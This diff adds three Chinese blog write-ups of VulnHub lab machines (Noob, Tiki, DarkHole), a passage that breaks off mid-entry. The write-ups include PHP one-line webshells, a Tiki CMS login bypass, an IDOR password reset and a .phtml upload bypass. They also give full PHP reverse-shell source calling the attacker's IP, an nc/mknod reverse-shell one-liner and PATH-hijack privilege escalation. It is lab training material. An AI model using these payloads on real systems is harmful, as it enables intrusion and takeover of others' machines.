@@ -122,6 +122,290 @@
       </tags>
   </entry>
   <entry>
+    <title>vlunhub noob靶场总结</title>
+    <url>/2022/11/01/14-23-40/</url>
+    <content><![CDATA[<h2 id="又开了新的vlunhub靶场—–noob靶场（菜鸟）"><a href="#又开了新的vlunhub靶场—–noob靶场（菜鸟）" class="headerlink" title="又开了新的vlunhub靶场—–noob靶场（菜鸟）"></a>又开了新的vlunhub靶场—–noob靶场（菜鸟）</h2><h1 id="首先还是先讲述遇到的问题："><a href="#首先还是先讲述遇到的问题：" class="headerlink" title="首先还是先讲述遇到的问题："></a>首先还是先讲述遇到的问题：</h1><h2 id="ftp服务浏览器访问不了"><a href="#ftp服务浏览器访问不了" class="headerlink" title="ftp服务浏览器访问不了"></a>ftp服务浏览器访问不了</h2><p>这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。</p>
+<h3 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h3><p>使用文件夹打开的方式：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png"></p>
+<p>如图所示在文件夹搜索框输入：<a href="ftp://192.168.50.130/">ftp://192.168.50.130</a>  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的，有的ftp服务是需要输入账号密码的。本次靶机限定了读取和下载功能不能修改和上传.  (也是,如果能修改和上传直接改成一句话木马不就行了)</p>
+<h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>在开始之前我们都要知道如何查找靶机的IP地址</p>
+<h3 id="查找攻击机IP："><a href="#查找攻击机IP：" class="headerlink" title="查找攻击机IP："></a>查找攻击机IP：</h3><p>Linux：ifconfig</p>
+<p>Windows：ipconfig</p>
+<h3 id="网段扫描：-发现靶机IP"><a href="#网段扫描：-发现靶机IP" class="headerlink" title="网段扫描：(发现靶机IP)"></a>网段扫描：(发现靶机IP)</h3><p>kili: netdiscover -r 192.168.50.1/24</p>
+<p>本次靶机相对于之前的earth靶机更容易，主要信息收集手段为nmap</p>
+<p>使用nmap命令:</p>
+<h3 id="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"><a href="#使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务" class="headerlink" title="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"></a>使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务</h3><p>命令： nmap -sV -Pn -sT -sC -A -p- 192.168.50.130</p>
+<p>（应该开单章来说明一下信息收集中的工具命令）</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101150614.png"></p>
+<p>如图所示,标下划线的为开启的服务，图中就能看出全端口扫描的作用</p>
+<h1 id="通过ftp服务获取网站的登录账号密码"><a href="#通过ftp服务获取网站的登录账号密码" class="headerlink" title="通过ftp服务获取网站的登录账号密码"></a>通过ftp服务获取网站的登录账号密码</h1><p>如开头中所粘贴的图片所示，在ftp服务里将其中的两个文件下载到本地</p>
+<p>在cre.txt 文件中得到一串base64加密过的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y2hhbXA6cGFzc3dvcmQ=</span><br></pre></td></tr></table></figure>
+
+<p>解密得:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">champ:password</span><br></pre></td></tr></table></figure>
+
+<p>使用账号密码登录:(当然在得到这个账号密码前肯定在这个登陆界面进行过其他的测试,如弱口令,注入等)</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151446.png"></p>
+<p>登陆成功,在箭头所指的功能点,我们获取到一个.rar压缩文件.</p>
+<h1 id="图片隐写破译"><a href="#图片隐写破译" class="headerlink" title="图片隐写破译"></a>图片隐写破译</h1><p>如图</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151836.png"></p>
+<p>在下载下的压缩文件里看到两张图片,根据攻略可知里面包含了图片隐写.(不看攻略你知道有这东西?实战里有谁会丧心病狂的将自己的账号密码隐写放在图片中.)</p>
+<p>参考链接:<a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p>
+<p>具体破译我就不尝试了,直接抄袭</p>
+<p>最后得到ssh服务的登录账号密码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wtf:this one is a simple one</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101152924.png"></p>
+<p>如图箭头所示:</p>
+<p>成功远程登陆上ssh服务</p>
+<p>可以使用lastlog命令查看这台靶机的可以登录的账号以及登陆历史</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101154430.png"></p>
+<p>有一些是我在测试时添加到账号.</p>
+<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101155258.png"></p>
+<p>从这张图可以看出我的历程,Linux命令不熟悉.</p>
+<h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h1><p>在看了这两个协议后,我想通过这两个协议上传webshell</p>
+<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一:"></a>尝试一:</h2><p>使用ssh协议进行文件.</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /home/wugezhang/test.php wtf@192.168.50.130:/home/wtf/Downloads</span><br></pre></td></tr></table></figure>
+
+<p>不成功:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: connect to host 192.168.50.130 port 22: Connection refused</span><br><span class="line">scp: Connection closed </span><br><span class="line"></span><br><span class="line">ssh：连接到主机 192.168.50.130 端口 22：连接被拒绝</span><br><span class="line">SCP：连接已关闭</span><br></pre></td></tr></table></figure>
+
+<p>一系列操作后发现不现实,如果能在对方环境添加环境变量更改设置了那传不传shell也无所谓了.</p>
+<p>但做好权限维持才是持久的道理.</p>
+<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二:"></a>尝试二:</h2><p>使用匿名的ftp协议服务进行文件上传shell</p>
+<p>尝试将文件上传进ftp服务的文件夹但失败了,我们只有下载与读的权限,没有上传与修改权限.</p>
+<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三:"></a>尝试三:</h2><p>尝试直接使用命令写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_post[test]);?&gt;&quot; &gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>但失败了,在命令里直接就将$_post给执行了</p>
+<h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>1.Windows：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ^&lt;? php @eval($_POST[&#x27;x&#x27;]); ?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<p>（1）^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功度能，如果需要把它们作为字符输出知的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需道要对这些特殊字符做转义处理：在每个特殊字符回前加上转义字符^答，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^|^|、echo ^^……之类的格式来处理。此处转义&lt;和&gt;</p>
+<p>（2） 此处^为什么不换成引号？因为windows写入时会把引号写进去</p>
+<p>2.Linux:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27; &gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<p>$为linux系统的变量符号，原样输出字符串，不进行转义或取变量用单引号（此处否则会把$_POST当成变量处理）,x用双引号是为了和单引号区分</p>
+<h4 id="其次"><a href="#其次" class="headerlink" title="其次"></a>其次</h4><p>我们要写入网站的目录文件里面才能远程链接到shell</p>
+<p>失败了,我找不到网站根目录在哪里.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221101184629.gif"></p>
+<p>。。。。。。。。。。。。。</p>
+<h1 id="找到网站根目录"><a href="#找到网站根目录" class="headerlink" title="找到网站根目录"></a>找到网站根目录</h1><p>默认路径: /var/www/html</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101194829.png"></p>
+<p>发现前面的shell.php文件和test.php文件没能执行</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195012.png"></p>
+<p>shell.php木马也没能在蚁剑上成功链接.</p>
+<p>但test.txt文件是可以成功显示的</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195238.png"></p>
+<p>说明这样尝试是成功的.</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶机的难度很低,最重要的就是使用nmap和Linux命令,</p>
+<p>图片隐写技术在现实生活中很少能用的上,主要就是ctf比赛里面的应用,所以本次我并没有花时间篇幅去使用.</p>
+<p>这次的靶机在我看来强调的就是ftp服务和ssh远程登录服务</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp协议用于计算机与计算机之间的数据传输文件传输,不同于HTTP协议.ftp服务默认开启21端口,使用账号密码登录(设置后),也可以匿名登录(不安全).</p>
+<p>链接:<a href="https://www.cnblogs.com/peterYong/p/8630542.html">【FTP】详解 - peterYong - 博客园 (cnblogs.com)</a></p>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh协议是用来支持远程登录的协议,也可以在有限制的条件下进行文件传输与读取.</p>
+<p>链接:<a href="https://blog.csdn.net/m0_52165864/article/details/126028681"> SSH服务详解_欢喜躲在眉梢里的博客-CSDN博客_ssh服务</a></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vlunhub-tiki靶场</title>
+    <url>/2022/11/02/17-48-47/</url>
+    <content><![CDATA[<h1 id="vlunhub-tiki靶场（简单）"><a href="#vlunhub-tiki靶场（简单）" class="headerlink" title="vlunhub-tiki靶场（简单）"></a>vlunhub-tiki靶场（简单）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><p>整次打靶过程可以说很顺利，可以很快速的达到自己想要的目的，但最重要的一点就是语言不通，进入后台后一直找不到ssh账号密码存在点，如果是实际渗透测试，可能花费的时间会更多。</p>
+<p>此外还在里面留了个坑，在本次的靶机里有一个文件上传点，要在里面测试能否实现木马后门传递。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>老规矩先使用ifconfig查找自己的IP</p>
+<p>使用netdiscover -r 192.168.50.1/24 探测靶机IP地址</p>
+<h2 id="注"><a href="#注" class="headerlink" title="注:"></a>注:</h2><p><img src=""><img src="/imgs/$%7Bfiilename%7D/image-20221102180434475-1667383526051.png" alt="image-20221102180434475"></p>
+<p>192.168.50.1   192.168.50.2     192.168.50.254 都是默认IP</p>
+<h2 id="使用nmap进行扫描"><a href="#使用nmap进行扫描" class="headerlink" title="使用nmap进行扫描"></a>使用nmap进行扫描</h2><p>命令:nmap -A</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102180946.png"></p>
+<p>如标注所示,在80端口找到突破点.</p>
+<p>这里的ssh历史我怀疑就是后面我们能凭借网站后台得到的账号密码登陆的原因</p>
+<p>或者是从这个ssh历史猜测</p>
+<p>我们得到的账号密码就能考虑为ssh的登录账号密码</p>
+<h2 id="网站显示"><a href="#网站显示" class="headerlink" title="网站显示"></a>网站显示</h2><p>依据扫描得到的robots.txt</p>
+<p>我们进入robots.txt界面</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182447.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182622.png"></p>
+<p>在进入箭头指示的地址界面就能得到一个登陆界面</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182803.png"></p>
+<p>在登录点尝试弱口令无果后,依据网站的Wiki cms,搜索曾经爆出的漏洞</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102183030.png"></p>
+<p>此cms曾爆出过漏洞,而且作者也明确了存在该漏洞.</p>
+<h2 id="Wiki-cms-漏洞利用"><a href="#Wiki-cms-漏洞利用" class="headerlink" title="Wiki cms 漏洞利用"></a>Wiki cms 漏洞利用</h2><p>依据漏洞poc进行测试</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102183900.png"></p>
+<p>设定password为变量,设置payloads后就可以爆破了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184104.png"></p>
+<h3 id="爆破成功"><a href="#爆破成功" class="headerlink" title="爆破成功"></a>爆破成功</h3><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184431.png"></p>
+<p>如图,在爆破达到一定数量后,我们使用burp抓包修改为空密码就能登陆进去了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184453.png"></p>
+<p>登陆进去</p>
+<p>在 Wiki =&gt;last changes里面找到了ssh的账号密码</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102185130.png"></p>
+<p> ssh账号密码: silky:Agy8Y7SPJNXQzqA </p>
+<h1 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录:"></a>ssh登录:</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102185939.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102190314.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>该靶场的难度并不大,还是</p>
+<p>信息收集,检测利用,得到ssh账号密码,ssh远程登录,权限查询,得到flag</p>
+<p>还考了我们burp的使用</p>
+<h2 id="新密码"><a href="#新密码" class="headerlink" title="新密码"></a>新密码</h2><p>嫌密码太复杂我直接修改他的密码</p>
+<p>新密码：123456</p>
+<p>和上个靶机一样无法使用webshell工具链接</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vlunhub-darkhole靶场</title>
+    <url>/2022/11/06/15-57-44/</url>
+    <content><![CDATA[<h1 id="vlunhub-darkhole-靶场（简单-提权）"><a href="#vlunhub-darkhole-靶场（简单-提权）" class="headerlink" title="vlunhub-darkhole 靶场（简单-提权）"></a>vlunhub-darkhole 靶场（简单-提权）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><h2 id="本次靶场带来了许多新知识点"><a href="#本次靶场带来了许多新知识点" class="headerlink" title="本次靶场带来了许多新知识点"></a>本次靶场带来了许多新知识点</h2><h3 id="1）反弹shell-php-reverse-shell"><a href="#1）反弹shell-php-reverse-shell" class="headerlink" title="1）反弹shell (php-reverse-shell)"></a>1）反弹shell (php-reverse-shell)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.50.131&quot;;</span><br><span class="line">$port = &quot;8888&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="食用方法"><a href="#食用方法" class="headerlink" title="食用方法"></a>食用方法</h4><p>新建php文件,将此代码复制粘贴进去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ip = &quot;192.168.50.131&quot;;</span><br><span class="line">$port = &quot;8888&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>修改上述ip和端口</p>
+<p>ip为攻击机ip,端口自定</p>
+<p>我的为kali系统,所以IP为kali的IP地址,端口为卡里 nc -lvvp “端口”</p>
+<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2)提权"></a>2)提权</h2><p>在本靶机里涉及到三次提权,后文会依次说明</p>
+<h3 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty as pt;pt.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="环境变量提权-joho提权"><a href="#环境变量提权-joho提权" class="headerlink" title="环境变量提权(joho提权)"></a>环境变量提权(joho提权)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;bash&#x27; &gt; /tmp/id;chmod +x /tmp/id; export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h3><p>在该方式下 chmod 777 id 的解释:</p>
+<p><a href="https://blog.csdn.net/rjszz1314/article/details/104399333">chmod 777 到底是啥 ???看完这个你就完全懂了！_人间世庄子的博客-CSDN博客_chmod777</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp   // 回到tmp目录</span><br><span class="line">touch id   //创建假的id命令文件</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; id//id文件中写入/bin/bash 字段，生成一个shell</span><br><span class="line">chmod 777 id    //赋予id全文件权限</span><br><span class="line">export PATH=/tmp:$PATH //设置环境变量</span><br><span class="line">cd /home/john</span><br><span class="line">./toto</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/wangxueying5172/article/details/121552506"> DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-老规矩-查看靶机IP地址"><a href="#1-老规矩-查看靶机IP地址" class="headerlink" title="1.老规矩,查看靶机IP地址"></a>1.老规矩,查看靶机IP地址</h2><p>使用netdiscover -r 192.168.50.1/24 探测靶机IP地址</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221106161918.png"></p>
+<p>192.168.50.133</p>
+<h2 id="2-nmap-A进行系统性信息收集"><a href="#2-nmap-A进行系统性信息收集" class="headerlink" title="2.nmap -A进行系统性信息收集"></a>2.nmap -A进行系统性信息收集</h2><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%871.png"></p>
+<p>可以发现靶机开放了80端口和22端口,ssh服务开放</p>
+<p>nmap中无法获得更近一步的信息,</p>
+<h1 id="网站破口漏洞-越权修改密码"><a href="#网站破口漏洞-越权修改密码" class="headerlink" title="网站破口漏洞:越权修改密码"></a>网站破口漏洞:越权修改密码</h1><p>访问192.168.50.133的80端口</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%872.png"></p>
+<p>看到一个登录口,可以测试弱口令,sql注入等</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%873.png"></p>
+<p>前期我们已经通过注册账户测试知道该后台已存在admin账户</p>
+<p>在此我们注册测试账户:test/test</p>
+<p>通过测试账户登录后,后台界面普通账户只有修改账户密码的功能</p>
+<p>使用burp suite抓包</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%874.png"></p>
+<p>如图所标注,该账号是我测试所注册的第三个账号,推测该后台存在一个id=1的admin账户,前期测试时以确定可以通过修改提交信息中的id值可以修改对应id的账户密码.</p>
+<h3 id="使用测试账户修改admin账户的密码后"><a href="#使用测试账户修改admin账户的密码后" class="headerlink" title="使用测试账户修改admin账户的密码后"></a>使用测试账户修改admin账户的密码后</h3><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%876.png"></p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>该管理员账户可以远程上传文件,所以我们可以尝试上传木马文件留下我们的后门.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%877.png"></p>
+<p>发现有文件后缀名检测,但没有检测我们的文件内容,尝试后缀名绕过,</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%878.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%879.png"></p>
+<p>测试一圈后发现该后台进行了文件上传的限制有点大,(遇到的情况太少,经验不足以解决.)查找攻略后发现phtml后缀的php代码文件可以上传,可以执行</p>
+<p>先上传一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码执行成功</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8710.png"></p>
+<p>那就可以上传我们的小马了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_post[shell]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用蚁剑链接"><a href="#使用蚁剑链接" class="headerlink" title="使用蚁剑链接"></a>使用蚁剑链接</h3><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8711.png"></p>
+<p>可以看到蚁剑已经连接成功,</p>
+<p>但在测试访问文件时发现权限太低无法获取更多权限.</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="提权1-失败"><a href="#提权1-失败" class="headerlink" title="提权1:失败"></a>提权1:失败</h2><p>在查看攻略时,使用了一种 我没见过的提权方法</p>
+<h3 id="使用mknod命令提权"><a href="#使用mknod命令提权" class="headerlink" title="使用mknod命令提权"></a>使用mknod命令提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mknod 设备名称  p &amp;&amp; nc  kali 的ip   kali的端口  0&lt;设备名称 | /bin/bash 1&gt;设备名称</span><br><span class="line">example: mknod backdoor p &amp;&amp; nc 192.168.133.131 8888 0&lt;backdoor | /bin/bash 1&gt;backdoor 获取回显窗口</span><br></pre></td></tr></table></figure>
+
+<p>在蚁剑虚拟终端中输入上述对应的代码后,再在kali中使用nc监听端口,但我测试失败了,搞不懂.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8712.png"></p>
+<p>原文链接:<a href="https://blog.csdn.net/wangxueying5172/article/details/121552506"> DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
+<p>参考文章:<a href="https://www.cnblogs.com/hnrainll/archive/2011/06/10/2077583.html">mknod用法以及主次设备号 - Leo Chin - 博客园 (cnblogs.com)</a></p>
+<h1 id="提权2-成功"><a href="#提权2-成功" class="headerlink" title="提权2:成功"></a>提权2:成功</h1><p>在另一篇博文中找到了另一种直接将shell反弹到我们攻击机的方法(就是反弹shell)</p>
+<h2 id="php-reverse-shell"><a href="#php-reverse-shell" class="headerlink" title="php-reverse-shell"></a>php-reverse-shell</h2><p>得益于前期测试出的php代码可执行后缀phtml</p>
+<p>我们的反弹shell文件得以上传执行</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8713.png"></p>
+<p>get shell成功后,我们的权限还是太低了,kali 中获得shell 窗口，但是返回的shell 没有显示你所在文件目录,现阶段是那个用户，所以需要使用python 来返回一个shell，大多数Linux 都安装了python3，所以使用python3 来生成一个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty as pt;pt.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考文章后我才知道这种方式获得到的shell是不能使用ctrl +c 以及箭头指令的</p>
+<p>参考文章:<a href="https://blog.csdn.net/weixin_44604541/article/details/117554884">实现交互式shell的几种方式：python pty 方式、升级nc、socat、script获取pty_思源湖的鱼的博客-CSDN博客_python pty</a></p>
+<p>拿到完整的shell后就可以进一步测试了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8714.png"></p>
+<p>如图,进行大部分已知到的测试后发现权限还是太低了,得提权到root权才能达到我们的目的</p>
+<h2 id="环境变量提权-失败"><a href="#环境变量提权-失败" class="headerlink" title="环境变量提权(失败)"></a>环境变量提权(失败)</h2><p>参考文章:<a href="https://www.freebuf.com/articles/others-articles/284338.html">DARKHOLE: 1靶机 - FreeBuf网络安全行业门户</a></p>
+<p>该提权是在pass ward文件所在的文件路径下的提权 home/john</p>
+<p>使用方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;bash&#x27; &gt; /tmp/id;chmod +x /tmp/id; export PATH=/tmp:$PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8715.png"></p>
+<p>失败了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8716.png"></p>
+<p>环境变量提权参考文章:[( Linux环境变量劫持提权_全局变量Global的博客-CSDN博客_linux环境变量提权)](<a href="https://blog.csdn.net/nicai321/article/details/122275160#:~:text=linux">https://blog.csdn.net/nicai321/article/details/122275160#:~:text=linux</a> 的 环境变量提权 跟window的 环境变量提权 的思路也是一致的%2C当执行某个命令时%2CShell会按PATH 环境变量 的路径依次搜索命令%2C搜到即停止。,的 劫持提权 。 提权 方法：利用系统命令修改 环境变量 路径 劫持提权)</p>
+<h2 id="另一种环境变量提权-成功"><a href="#另一种环境变量提权-成功" class="headerlink" title="另一种环境变量提权(成功)"></a>另一种环境变量提权(成功)</h2><p>该方法其实和上方失败的方法是本质是一样的,都是通过劫持环境变量,使用假命令来达到欺骗系统的目的</p>
+<p>原文描述:</p>
